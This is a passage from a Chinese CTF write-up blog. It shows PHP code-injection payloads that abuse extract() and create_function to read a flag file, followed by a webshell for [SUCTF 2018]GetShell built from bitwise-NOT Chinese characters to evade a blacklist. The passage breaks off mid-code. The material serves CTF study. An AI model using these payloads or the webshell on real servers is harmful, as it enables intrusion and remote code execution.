class="hljs-string">\.</span>|<span class="hljs-string">log</span>|<span class="hljs-string">\^/i&#x27;, $arg) ) </span><br><span class="hljs-string">//ban了这么这么多，肯定不能用一般方法传入payload了</span><br><span class="hljs-string">&#123; </span><br><span class="hljs-string">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="hljs-string">&#125; else &#123; </span><br><span class="hljs-string">    include &quot;flag.php&quot;;//包含了flag.php这个文件</span><br><span class="hljs-string">    $code(&#x27;&#x27;, $arg);</span><br><span class="hljs-string">&#125; ?&gt;</span><br></code></pre></td></tr></table></figure>

<p>由<code>extract($_GET[&quot;flag&quot;]);</code>知code和arg是可更改变量</p>
<p>extract函数会注册变量，可以用来覆盖$code或$arg。</p>
<p>使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量，所以这里我们可以传数组，即<code>flag[code]</code>和<code>flag[arg]</code>的形式</p>
<p>利用create_function,对于</p>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-variable">$aaa</span> = create_function(<span class="hljs-string">&#x27;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>&#x27;</span>, <span class="hljs-string">&#x27;return <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaa</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;<br>&#125;  <br></code></pre></td></tr></table></figure>

<p>对于</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$code</span>=return <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;&#125;fction();<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> aaa(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>)&#123;<br>    return <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;<br>&#125;  <br>fction();<span class="hljs-regexp">//</span>&#125;（fction为某个任意函数，<span class="hljs-string">&quot;//&quot;</span>可以注释掉后面的内容）<br></code></pre></td></tr></table></figure>

<p>应用到本题,可以得到</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">flag</span>[code]=create_function&amp;<span class="hljs-built_in">flag</span>[arg]=&#125;fction();<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>

<p>利用<code>get_defined_vars()</code>将所有变量和值都进行输出</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">flag<span class="hljs-literal">[<span class="hljs-identifier">code</span>]</span>=create_function&amp;flag<span class="hljs-literal">[<span class="hljs-identifier">arg</span>]</span>=&#125;var<span class="hljs-constructor">_dump(<span class="hljs-params">get_defined_vars</span>()</span>);<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">file<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span>&amp;<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-operator">=</span><span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>A&amp;<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span>[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%64</span>[]<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span><span class="hljs-variable">%63</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%66</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span>&#125;<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%70</span>(<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%64</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%73</span>())<span class="hljs-comment">;//</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404082148359.png" srcset="/img/loading.gif" lazyload alt="image-20240408214807275"></p>
<p><strong>提示了flag在rea1fl4g.php里，所以考虑用require函数，php&#x2F;&#x2F;filter读取文件</strong></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">require(php://<span class="hljs-keyword">filter</span>/read<span class="hljs-operator">=</span>convert.base<span class="hljs-number">64</span>-encode/resource<span class="hljs-operator">=</span>rea<span class="hljs-number">1</span>fl<span class="hljs-number">4</span>g.php)<br>url编码之后<br><br>require(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f)<br><br>利用异或或者~进行取反操作<br><br>require(~(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f))<br><br>替换上一步中的var_dump(get_defined_vars())<br></code></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">file<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span>&amp;<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-operator">=</span><span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>A&amp;<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span>[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%64</span>[]<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span><span class="hljs-variable">%63</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%66</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span>&#125;require(~(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f))<br><span class="hljs-comment">;//</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404082151012.png" srcset="/img/loading.gif" lazyload alt="image-20240408215101937"></p>
<p>进行base64解码，得到flag</p>
<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br>  <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$contents</span>,<span class="hljs-number">5</span>);<br>  <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$black_char</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$b</span>) !== <span class="hljs-literal">false</span>)&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal char&quot;</span>);<br>    &#125;<br>  &#125;   <br>&#125; <br></code></pre></td></tr></table></figure>

<p>检查文件内容（内容前五位不检查），内容中有匹配到黑名单的输出<code>illegal char</code></p>
<p>文件上传成功后会修改文件后缀为<code>php</code>，那么就需要构造一个webshell成功上传即可</p>
<p>首先需要fuzz，弄清楚黑名单没有哪些字符，再通过这些字符构造webshell</p>
<p>可以通过的字符有：<code>$</code>、<code>(</code>、<code>)</code>、<code>.</code>、<code>;</code>、<code>=</code>、<code>[</code>、<code>]</code>、<code>_</code>、<code>~</code>，然后就是汉字了</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%8F%96%E5%8F%8D%E6%B1%89%E5%AD%97%E7%BB%95%E8%BF%87">https://blog.csdn.net/mochu7777777/article/details/104631142，使用取反汉字绕过</a></p>
<p>构造一个<code>assert($_POST[_])</code></p>
<p>索引<code>1</code>不能再以数字形式直接表示，会被过滤的，在PHP中，两个空数组进行比较会得到<code>true</code>，而<code>true==1</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$__</span> = [];<br><span class="hljs-variable">$_</span> = (<span class="hljs-variable">$__</span> == <span class="hljs-variable">$__</span>);<span class="hljs-comment">//$_ = 1</span><br></code></pre></td></tr></table></figure>

<p>测试汉字</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//Author: m0c1nu7 </span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_split_unicode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>, <span class="hljs-variable">$l</span> = <span class="hljs-number">0</span></span>) </span>&#123;<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$l</span> &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$len</span> = <span class="hljs-title function_ invoke__">mb_strlen</span>(<span class="hljs-variable">$str</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span> += <span class="hljs-variable">$l</span>) &#123;<br>            <span class="hljs-variable">$ret</span>[] = <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$i</span>, <span class="hljs-variable">$l</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&quot;//u&quot;</span>, <span class="hljs-variable">$str</span>, -<span class="hljs-number">1</span>, PREG_SPLIT_NO_EMPTY);<br>&#125;<br> <br><span class="hljs-variable">$s</span> = <span class="hljs-string">&#x27;你归来是诗离去成词且笑风尘不敢造次我糟糠能食粗衣也认煮酒话桑不敢相思你终会遇见这么一个人他会用整个人生将你精心收藏用漫长岁月把你妥善安放怕什么岁月漫长你心地善良,终会有一人陪你骑马喝酒走四方为你唱一首歌歌中有你亦有我我的泪我的魅将都融入到我的歌声里飘向孤独的你你是否听到了我的歌曲是否也在黯然落泪？岁月匆匆人生漫漫漠视了真情谁是站谁的谁已经变得不重要至少曾经已拥有长相思爱相随时空隔离谁相陪？花前月下心随风相思一片梦成空笑看往事红尘中多少凝思付清秋？长相思泪相随曾经谁是谁的谁？孤星冷月泪盈盈念曾经相逢心长时光短让人垂泪到天明长相思苦相随窗前双燕比翼飞日暮情人成双对于时光无垠的田野中没有早一步也没有晚一步恰好遇见了想要遇见的人这是一段多少美丽而令人心动的尘缘于爱情来说相见恨早会恨晚站会留下梨花带雨的疼痛而于友情来说无论太早或者太迟都是一份值得珍惜的情缘晚秋缓缓走晚了我的轮回疏雨一刻半疏笼起我深深的梦馀昨日遗憾寸寸疏雨挑涸泪烛落笔无处飒晚秋彼晚秋未晚懒我疏雨疏风去归我初心还我清梦唯我在晚秋未晚里守望那疏雨半疏的麦田待下一片梧桐叶复舞我亦拾起我的旧梦旧梦清寒一枕乱我眸中晚秋躞蹀的雨疏疏拍窗我的晚秋疏雨半疏疏开昨日我的梦情缘如海深邃澈蓝干涸成妄谈一湛清湖泪潸然一颦寒眉锁阑珊只为你而欣悦只因你而清泪斑斑你是我的前世吧为何沁泊在我的心怀缱绻起涟波千层驻我心扉知我情怀从此我已习惯你的嘘寒问暖懒倦地痴卧在你的胸怀红霞满腮昨天再苦都要用今天的微笑把它吟咏成一段幸福的记忆；曾经再累都要用当站下的遗忘穿越万道红尘让心波澜不惊人生最大的荣耀不在于从不跌倒而在于每一次跌倒后都能爬起来回忆是件很累的事就像失眠时怎么躺都不对的样子有时候往往直到离开在回忆里才能知道自己有多喜欢一座城&#x27;</span>;<br><br><span class="hljs-variable">$arr_str</span>=<span class="hljs-title function_ invoke__">str_split_unicode</span>(<span class="hljs-variable">$s</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>) ; <span class="hljs-variable">$i</span>++) &#123; <br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr_str</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&#x27; ------- &#x27;</span>.~<span class="hljs-variable">$arr_str</span>[<span class="hljs-variable">$i</span>][<span class="hljs-number">1</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br> <br> <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php <br><span class="hljs-variable">$__</span> = [];<br><span class="hljs-variable">$_</span> = (<span class="hljs-variable">$__</span> == <span class="hljs-variable">$__</span>);<span class="hljs-regexp">//</span><span class="hljs-variable">$_</span> = <span class="hljs-number">1</span><br><br><span class="hljs-variable">$__</span> = ~(融);<br><span class="hljs-variable">$___</span> = <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>a<br><span class="hljs-variable">$__</span> = ~(匆);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>].<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>ass<br><span class="hljs-variable">$__</span> = ~(随);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>asse<br><span class="hljs-variable">$__</span> = ~(千);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>asser<br><span class="hljs-variable">$__</span> = ~(苦);<br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>assert<br><br><span class="hljs-variable">$____</span> = ~(~(_));<span class="hljs-regexp">//</span>_<br><span class="hljs-variable">$__</span> = ~(诗);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>_P<br><span class="hljs-variable">$__</span> = ~(尘);<br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-regexp">//</span>_PO<br><span class="hljs-variable">$__</span> 